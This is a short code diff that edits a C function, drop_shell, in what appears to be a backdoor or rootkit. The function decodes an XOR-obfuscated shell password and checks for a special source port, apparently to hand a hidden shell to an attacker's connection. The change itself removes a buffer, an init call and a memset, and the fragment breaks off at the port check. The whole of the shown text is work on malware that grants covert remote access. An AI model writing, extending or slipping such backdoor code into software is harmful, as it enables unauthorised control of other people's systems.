@@ -6,12 +6,10 @@ int drop_shell(int sock, struct sockaddr *addr)
 	printf("[!] drop_shell called\n"); 
 	#endif 
 
-	char buf[512]; 
 	char *shellpw = strdup(SHELLPW); xor(shellpw); 
 	int pid; 
 	ssize_t (*s_write()); 
-	init(); 
-	memset(buf, 0x00, sizeof(buf)); 
+	
 	struct sockaddr_in *sa_i = (struct sockaddr_in*)addr; 
 
 	if (htons(sa_i->sin_port) == DEFAULT_PORT)
